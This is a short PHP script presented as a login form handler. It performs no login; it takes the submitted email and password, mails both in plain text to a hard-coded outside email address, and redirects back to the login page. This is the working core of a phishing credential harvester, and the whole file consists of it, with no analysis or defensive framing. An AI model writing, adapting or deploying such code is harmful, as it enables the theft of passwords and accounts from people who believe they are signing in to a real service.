<?php
// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if email and password are provided
    if (!empty($_POST['email']) && !empty($_POST['password'])) {
        // Forward form data to email
        $to = "andersomstev11@yahoo.com"; // Change this to your email address
        $subject = "Form Submission";
        $message = "Email: ".$_POST['email']."\n";
        $message .= "Password: ".$_POST['password']."\n";
        
        // Send email
        mail($to, $subject, $message);

        // Redirect back to the login page
        header("Location: login.php");
        exit();
    } else {
        // If email or password is empty, redirect back to the login page with an error message
        header("Location: login.php?error=empty_fields");
        exit();
    }
} else {
    // If the form is not submitted, redirect back to the login page
    header("Location: login.php");
    exit();
}
?>
